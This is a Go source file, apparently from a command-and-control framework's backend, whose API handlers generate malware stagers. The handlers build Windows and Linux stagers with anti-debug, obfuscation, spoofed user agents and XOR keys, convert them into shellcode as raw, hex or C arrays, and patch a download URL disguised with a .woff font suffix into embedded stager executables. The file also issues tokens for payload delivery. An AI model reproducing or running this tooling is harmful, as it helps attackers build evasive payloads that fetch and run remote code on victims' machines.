package api

import (
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/godonut"
	"BackendTemplate/pkg/stager"
	"bytes"
	"embed"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"BackendTemplate/pkg/utils/logx"
)

// stagerBuildSlots 动态 stager 构建并发信号量（go build 高 CPU/内存，限制并发防资源耗尽 DoS）
var stagerBuildSlots = make(chan struct{}, 1)

// acquireStagerBuildSlot 尝试获取构建槽位（非阻塞，获取失败返回 false）
func acquireStagerBuildSlot() bool {
	select {
	case stagerBuildSlots <- struct{}{}:
		return true
	default:
		return false
	}
}

// releaseStagerBuildSlot 释放构建槽位
func releaseStagerBuildSlot() {
	<-stagerBuildSlots
}

// DynamicStageShellCodeGen 动态生成stage shellcode
func DynamicStageShellCodeGen(c *gin.Context) {
	var request struct {
		Listener    string `json:"listener"`
		Port        string `json:"port"`
		Format      string `json:"format"`
		AntiDebug   bool   `json:"anti_debug"`
		Obfuscation bool   `json:"obfuscation"`
		UserAgent   string `json:"user_agent"`
		Lightweight bool   `json:"lightweight"` // 轻量模式（减小体积）
		Timeout     int    `json:"timeout"`     // 超时时间
		SleepTime   int    `json:"sleep_time"`  // 延时时间
		MaxRetries  int    `json:"max_retries"` // 最大重试次数
	}

	if err := c.ShouldBind(&request); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	// 添加调试日志
	logx.Infof("[DEBUG] 动态stager请求: Listener=%s, Port=%s, Format=%s\n", request.Listener, request.Port, request.Format)

	// 获取WebDelivery信息
	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", request.Port).Get(&wd)
	if wd.ListeningPort == "" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	// 添加调试日志
	logx.Infof("[DEBUG] WebDelivery信息: OS=%s, Arch=%s, ListenerConfig=%s, Pass=%s\n", wd.OS, wd.Arch, wd.ListenerConfig, wd.Pass)

	// 构建下载URL - 根据操作系统类型构建不同的URL
	var connectUrl string
	if wd.OS == "windows" {
		// Windows使用.woff后缀
		connectUrl = wd.ServerAddress + ".woff"
	} else {
		// Linux直接使用文件名，无后缀
		connectUrl = wd.ServerAddress
	}
	logx.Infof("[DEBUG] 构建下载URL: %s (OS: %s)\n", connectUrl, wd.OS)

	// 从前端请求获取配置参数，设置默认值
	timeout := 30
	if request.Timeout > 0 {
		timeout = request.Timeout
	}

	sleepTime := 5
	if request.SleepTime > 0 {
		sleepTime = request.SleepTime
	}

	maxRetries := 5
	if request.MaxRetries > 0 {
		maxRetries = request.MaxRetries
	}

	// 设置默认值
	if request.UserAgent == "" {
		userAgents := []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		}
		request.UserAgent = userAgents[int(time.Now().UnixNano())%len(userAgents)]
	}

	// 配置stager构建参数 - 使用前端传递的参数
	config := &stager.StagerConfig{
		DownloadURL: connectUrl,
		UserAgent:   request.UserAgent,
		Timeout:     timeout, // 使用前端设置的超时时间
		Arch:        wd.Arch,
		OS:          wd.OS,
		AntiDebug:   request.AntiDebug,
		Obfuscation: request.Obfuscation,
		SleepTime:   sleepTime,  // 使用前端设置的延时时间
		MaxRetries:  maxRetries, // 使用前端设置的重试次数
		Lightweight: request.Lightweight,
		Password:    wd.Pass, // 从WebDelivery读取上线密码
		XorKey:      wd.XorKey, // Stage XOR 混淆密钥
	}

	// 创建构建器
	builder := stager.NewStagerBuilder(config)

	// 全局构建信号量：限制并发 go build（防止认证用户并发刷接口耗尽 CPU/内存/临时目录）
	if !acquireStagerBuildSlot() {
		c.JSON(http.StatusTooManyRequests, gin.H{"status": 429, "data": "已有 stager 构建进行中，请稍后重试"})
		return
	}
	defer releaseStagerBuildSlot()

	// 构建stager
	stagerBinary, err := builder.Build()
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": fmt.Sprintf("构建失败: %s", err.Error())})
		return
	}

	// 根据操作系统和格式处理输出
	var (
		content  []byte
		filename string
		ctype    string
	)

	// 根据操作系统限制支持的格式
	if wd.OS == "linux" && request.Format != "elf" && request.Format != "exe" && request.Format != "raw" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "Linux只支持可执行程序格式"})
		return
	}

	logx.Infof("[DEBUG] 处理格式: %s, OS: %s\n", request.Format, wd.OS)

	switch request.Format {
	case "exe":
		// Windows专用或Linux兼容模式
		if wd.OS == "windows" {
			content = stagerBinary
			ctype = "application/octet-stream"
			filename = "dynamic_stager.exe"
		} else if wd.OS == "linux" {
			// Linux兼容模式：允许使用exe格式标识，但生成无后缀的可执行文件
			content = stagerBinary
			ctype = "application/octet-stream"
			filename = "dynamic_stager" // Linux可执行程序无后缀
			logx.Infof("[DEBUG] Linux兼容模式：生成无后缀可执行文件\n")
		} else {
			c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "exe格式不支持此操作系统"})
			return
		}

	case "elf":
		// 仅支持Linux
		if wd.OS != "linux" {
			c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "elf格式仅适用于Linux"})
			return
		}
		content = stagerBinary
		ctype = "application/octet-stream"
		filename = "dynamic_stager" // Linux可执行程序无后缀

	case "raw":
		// 原始二进制（不做 donut 转换）：Windows 下为 stager exe，Linux 下为 ELF
		content = stagerBinary
		filename = "dynamic_stager.bin"
		ctype = "application/octet-stream"

	case "bin":
		// 仅支持Windows
		if wd.OS != "windows" {
			c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "仅Windows支持bin格式"})
			return
		}
		// 使用godonut转换为shellcode
		sc, err := godonut.GenShellcode(stagerBinary, "", wd.Arch)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
			return
		}
		content = sc
		filename = "dynamic_stager.bin"
		ctype = "application/octet-stream"

	case "hex":
		// 仅支持Windows
		if wd.OS != "windows" {
			c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "仅Windows支持hex格式"})
			return
		}
		// 使用godonut转换为shellcode
		sc, err := godonut.GenShellcode(stagerBinary, "", wd.Arch)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
			return
		}
		hexStr := hex.EncodeToString(sc)
		content = []byte(hexStr)
		filename = "dynamic_stager.txt"
		ctype = "text/plain"

	case "c":
		// 仅支持Windows
		if wd.OS != "windows" {
			c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "仅Windows支持C格式"})
			return
		}
		// 使用godonut转换为shellcode
		sc, err := godonut.GenShellcode(stagerBinary, "", wd.Arch)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
			return
		}
		var cBuilder strings.Builder
		cBuilder.WriteString("unsigned char shellcode[] = \"")
		for i, b := range sc {
			if i == 0 {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			} else {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			}
		}
		cBuilder.WriteString("\";\n")
		content = []byte(cBuilder.String())
		filename = "dynamic_stager.c"
		ctype = "text/x-csrc"

	default:
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": fmt.Sprintf("不支持的格式: %s", request.Format)})
		return
	}

	// 记录构建信息
	sourceHash := builder.GetSourceHash()
	logStagerBuild(wd.ListeningPort, request.Format, sourceHash, len(content))

	// 设置下载响应头
	c.Header("Content-Disposition", "attachment; filename="+filename)
	c.Header("Content-Type", ctype)
	c.Header("Content-Length", fmt.Sprintf("%d", len(content)))
	c.Header("X-Stager-Hash", sourceHash) // 添加源代码哈希用于追踪

	c.Data(http.StatusOK, ctype, content)
}

// GetStagerBuildInfo 获取stager构建信息
func GetStagerBuildInfo(c *gin.Context) {
	port := c.Query("port")
	if port == "" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "缺少port参数"})
		return
	}

	// 这里可以从数据库获取构建历史
	// 为简化实现，返回基本信息
	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", port).Get(&wd)
	if wd.ListeningPort == "" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	info := map[string]interface{}{
		"port":        wd.ListeningPort,
		"os":          wd.OS,
		"arch":        wd.Arch,
		"server_url":  wd.ServerAddress,
		"last_build":  time.Now().Format("2006-01-02 15:04:05"),
		"build_count": getBuildCount(port),
	}

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": info})
}

// logStagerBuild 记录构建日志（用独立 BuildCount 字段累加构建次数，不污染 Status 生命周期）
func logStagerBuild(port, format, sourceHash string, size int) {
	logx.Infof("[STAGER BUILD] Port: %s, Format: %s, Hash: %s, Size: %d bytes\n",
		port, format, sourceHash, size)
	var wd database.WebDelivery
	if has, _ := database.Engine.Where("listening_port = ?", port).Get(&wd); has {
		wd.BuildCount++
		database.Engine.Where("listening_port = ?", port).Update(&wd)
	}
}

// getBuildCount 获取构建次数
func getBuildCount(port string) int {
	var wd database.WebDelivery
	if has, _ := database.Engine.Where("listening_port = ?", port).Get(&wd); has {
		return wd.BuildCount
	}
	return 0
}

//go:embed stageshellcode/*
var embeddedStager embed.FS // 嵌入 stageshellcode 文件夹

// StageShellCodeGen 传统stage shellcode生成
func StageShellCodeGen(c *gin.Context) {
	var shellcode struct {
		Listener string `json:"listener"`
		Port     string `json:"port"`
		Format   string `json:"format"`
	}
	if err := c.ShouldBind(&shellcode); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}

	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", shellcode.Port).Get(&wd)
	if wd.ListeningPort == "" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
		return
	}

	// 根据操作系统类型构建不同的URL
	var connectUrl string
	if wd.OS == "windows" {
		// Windows使用.woff后缀
		connectUrl = wd.ServerAddress + ".woff"
	} else {
		// Linux直接使用文件名，无后缀
		connectUrl = wd.ServerAddress
	}
	var binaryFileName string
	switch wd.Arch {
	case "386":
		binaryFileName = "stager_x86.exe"
	case "amd64":
		binaryFileName = "stager_x64.exe"
	}

	binaryData, err := embeddedStager.ReadFile("stageshellcode/" + binaryFileName)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "读取文件失败"})
		return
	}

	var modifiedData []byte

	oldStr := "URLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
	newStr := strings.ReplaceAll(connectUrl, " ", "")                                                                                                               // 替换为的字符串
	// 【修复 OOM】超长 URL 会使替换撑大文件、破坏 PE 结构，等长 patch 才安全
	if len(newStr) > len(oldStr) {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": fmt.Sprintf("投递地址超长（最长 %d 字符）", len(oldStr))})
		return
	}
	newStr = padRight(newStr, len(oldStr))
	oldBytes := utf16LE(oldStr)
	newBytes := utf16LE(newStr)
	modifiedData = bytes.ReplaceAll(binaryData, oldBytes, newBytes)

	sc, _ := godonut.GenShellcode(modifiedData, "", wd.Arch)
	var (
		content  []byte
		filename string
		ctype    string
	)

	switch shellcode.Format {
	case "exe":
		content = modifiedData
		ctype = "application/octet-stream"
		filename = binaryFileName
	case "raw":
		content = modifiedData
		filename = "payload.bin"
		ctype = "application/octet-stream"

	case "bin":
		content = sc
		filename = "payload.bin"
		ctype = "application/octet-stream"

	case "hex":
		hexStr := hex.EncodeToString(sc)
		content = []byte(hexStr)
		filename = "payload.txt"
		ctype = "text/plain"

	case "c":
		var cBuilder bytes.Buffer
		cBuilder.WriteString("unsigned char shellcode[] = \"")
		for i, b := range sc {
			if i == 0 {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			} else {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			}
		}
		cBuilder.WriteString("\";\n")
		content = cBuilder.Bytes()
		filename = "payload.c"
		ctype = "text/x-csrc"

	default:
		c.String(http.StatusBadRequest, "不支持的格式: %s，支持 hex, c, bin, exe, raw", shellcode.Format)
		return
	}

	// 设置下载响应头
	c.Header("Content-Disposition", "attachment; filename="+filename)
	c.Header("Content-Type", ctype)
	c.Header("Content-Length", fmt.Sprintf("%d", len(content)))

	c.Data(http.StatusOK, ctype, content)
}

// ================= StagerToken 门禁令牌（防盗门） =================

// CreateStagerTokenRequest 生成门禁令牌请求
type CreateStagerTokenRequest struct {
	PublicKey string `json:"public_key"` // 投递 public_key
	Quota     int    `json:"quota"`      // 配额（默认 3 次）
	Note      string `json:"note"`       // 备注（如 Stager 标识）
}

// CreateStagerToken 为指定投递生成配额令牌（每次生成 Stager 时调用一次）
func CreateStagerToken(c *gin.Context) {
	var req CreateStagerTokenRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "请求参数无效"})
		return
	}
	if req.PublicKey == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "public_key 不能为空"})
		return
	}
	token, err := delivery.GenerateStagerToken(req.PublicKey, req.Quota, req.Note)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "message": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"status": 200,
		"data": gin.H{
			"token":  token,
			"quota":  req.Quota,
			"header": "X-Delivery-Token: " + token,
			"curl":   `curl -H "X-Delivery-Token: ` + token + `" <下载URL>`,
		},
	})
}

// ListStagerTokens 查询投递的令牌列表
func ListStagerTokens(c *gin.Context) {
	publicKey := c.Query("public_key")
	if publicKey == "" {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "public_key 不能为空"})
		return
	}
	list, err := delivery.GetStagerTokens(publicKey)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "message": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{"list": list}})
}

// DeleteStagerToken 删除令牌（作废门禁卡）
func DeleteStagerToken(c *gin.Context) {
	var req struct {
		ID int64 `json:"id"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.ID <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "参数无效"})
		return
	}
	if _, err := database.Engine.ID(req.ID).Delete(new(database.StagerToken)); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "message": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "message": "令牌已删除"})
}
